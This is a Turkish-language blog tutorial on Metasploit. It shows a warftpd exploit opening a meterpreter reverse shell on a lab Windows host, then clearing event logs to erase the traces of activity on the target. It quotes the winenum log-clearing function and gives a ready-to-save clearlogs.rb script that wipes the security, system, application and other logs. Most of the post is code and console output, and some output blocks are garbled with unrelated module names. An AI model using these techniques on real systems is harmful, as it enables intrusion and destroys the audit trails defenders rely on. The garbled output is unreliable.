---
draft: false

title:  'MSF Log Yönetimi'
date: '2017-06-05T13:21:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  "Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizlemek isteyebilirsiniz. Bu temizleme işlemi için öncelikle meterpreter in sağladığı\_winenum\_script kodlarının nasıl çalıştığına bakalım. Script dosyasını Metasploit Framework klasörünüzün altında\_/usr/share/metasploit-framework/scripts/meterpreter/winenum.rb\_adresinde bulabilirsiniz. Bu dosya içerisinde bir çok bölüm bulunmaktadır. Biz şimdilik sadece\_# Function for clearing all event logs\_kısmıyla ilgileneceğiz." 
 
url:  /tr/msf-log-yonetimi/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---
Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizlemek isteyebilirsiniz. Bu temizleme işlemi için öncelikle meterpreter in sağladığı `winenum` script kodlarının nasıl çalıştığına bakalım. Script dosyasını Metasploit Framework klasörünüzün altında `/usr/share/metasploit-framework/scripts/meterpreter/winenum.rb` adresinde bulabilirsiniz. Bu dosya içerisinde bir çok bölüm bulunmaktadır. Biz şimdilik sadece `# Function for clearing all event logs` kısmıyla ilgileneceğiz.
```bash
# Function for clearing all event logs
def clrevtlgs**()**
  evtlogs = [
    'security',
    'system',
    'application',
    'directory service',
    'dns server',
    'file replication service'
  ]
  print_status("Clearing Event Logs, this will leave and event 517")
  begin
    evtlogs.each **do** |evl|
      print_status("\tClearing the #{evl} Event Log")
      log = @client.sys.eventlog.open(evl)
      log.clear
      file_local_write(@dest,"Cleared the #{evl} Event Log")
    end
    print_status("All Event Logs have been cleared")
  rescue ::Exception => e
    print_status("Error clearing Event Log: #{e.class} #{e}")

  end
end
```

Programlama ile ilgilenenler kodları ve fonksiyonun nasıl çalıştığını rahatlıkla anlayacaktır. Yukarıdaki kodların ne işe yaradığını özetle açıklayalım. `evtlogs.each do |evl|` döngüsü, Windows’a ait ‘security’, ‘system’, ‘application’, ‘directory service’, ‘dns server’ ve ‘file replication service’ loglarını sırasıyla açar ve temizler.

Şimdi, hazır script yerine yukarıdaki dosyadan örnek alarak kendi script kodumuzu oluşturalım ve kaydedelim. Bunun için Meterpreter içnde Ruby kodlamayı kullanacağız. Temizlikten önce Windows Log durumunu aşağıdaki resimden görebilirsiniz.
<!-- wp:image {"id":1001,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/wp-content/uploads/2024/06/Eventlog-00.png" alt="" class="wp-image-1001" /></figure>
<!-- /wp:image -->
Biz sadece ‘system’ loglarını temizlemek istediğimizden yukarıdaki döngü içerisinden sadece `log = client.sys.eventlog.open(‘system’)` durumunu kullanacağız.

## Bu kısımda deneme yapıyoruz

Öncelikle hedef bilgisayarda bir meterpreter shell açmış olmalıyız.
```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 2 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
```

Ardından meterpreter shell içerisinden Ruby kodlayıcısını `irb` komutuyla çalıştırıyoruz ve aşağıdaki kodları yapıştırıyoruz.
```bash
meterpreter > irb
> Starting IRB shell
> The 'client' variable holds the meterpreter client
**>>** log = client.sys.eventlog.open('system')
=> #>#:0xb6779424 @client=#>, #>, #

"windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
```

Şimdi, meterpreter içerisinde `log.clear` komutuyla logların temizlenip temizlenmediğini kontrol edelim.
```bash
**>>** log.clear
=> #>#:0xb6779424 @client=#>,

/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
```
<!-- wp:image {"id":1002,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/wp-content/uploads/2024/06/Eventlog-01.png" alt="" class="wp-image-1002" /></figure>
<!-- /wp:image -->
Meterpreter içerisinde Ruby kodlayıcısı kullanarak basit bir log temizleme denemesi yaptık ve yaptığımız kontrolde başarılı olduk. Bu yaklaşımı kullanarak kendi Script kodlarımızı yazabiliriz.

## Tüm Logları Temizleme

Aşağıdaki kodları bir dosyaya yazarak `/usr/share/metasploit-framework/scripts/meterpreter/` klasörüne `clearlogs.rb` adıyla kaydedin.
```bash
evtlogs = [
        'security',
        'system',
        'application',
        'directory service',
        'dns server',
        'file replication service'
        ]
print_line("Clearing Event Logs, this will leave an event 517")
evtlogs.each **do** |evl|
        print_status("Clearing the #{evl} Event Log")
        log = client.sys.eventlog.open(evl)
        log.clear
end
print_line("All Clear! You are a Ninja!")
```

Artık bu yeni oluşturduğunuz Script kodlarını yeni açtığınız Meterpreter oturumlarında çalıştırabilirsiniz.
```bash
msf exploit(warftpd_165_user) > exploit

> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Connecting to FTP server 172.16.104.145:21...
> Connected to target FTP server.
> Trying target Windows 2000 SP0-SP4 English...
> Transmitting intermediate stager for **over-sized stage...(191 bytes)
> Sending stage (2650 bytes)
> Sleeping before handling stage...
> Uploading DLL (75787 bytes)...
> Upload completed.
> Meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1253)

meterpreter > run clearlogs
Clearing Event Logs, this will leave an event 517
> Clearing the security Event Log
> Clearing the system Event Log
> Clearing the application Event Log
> Clearing the directory service Event Log
> Clearing the dns server Event Log
> Clearing the file replication service Event Log
All Clear! You are a Ninja!
meterpreter > exit
```

Aşağıdaki resimde görüldüğü gibi tüm loglar temizlenmiştir. Geriye sadece 517 numaralı işlem kalmıştır. O işlemde halen meterpreter’in çalıştığı proses olduğundan halen aktif durumdadır.
<!-- wp:image {"id":1003,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/wp-content/uploads/2024/06/Eventlog-03.png" alt="" class="wp-image-1003" /></figure>
<!-- /wp:image -->
Bu yazıda, Metasploit Framework içerisinde bulunan Scriptleri örnek alarak kendi script dosyamızı yazmayı ve log temizlemeyi göstermeye çalıştık. `/usr/share/metasploit-framework/scripts/meterpreter/` klasöründe bulunan diğer script dosyalarını da incelemenizi tavsiye ediyoruz. Bu sayede elinizdeki imkanları da öğrenmiş olacaksınız.
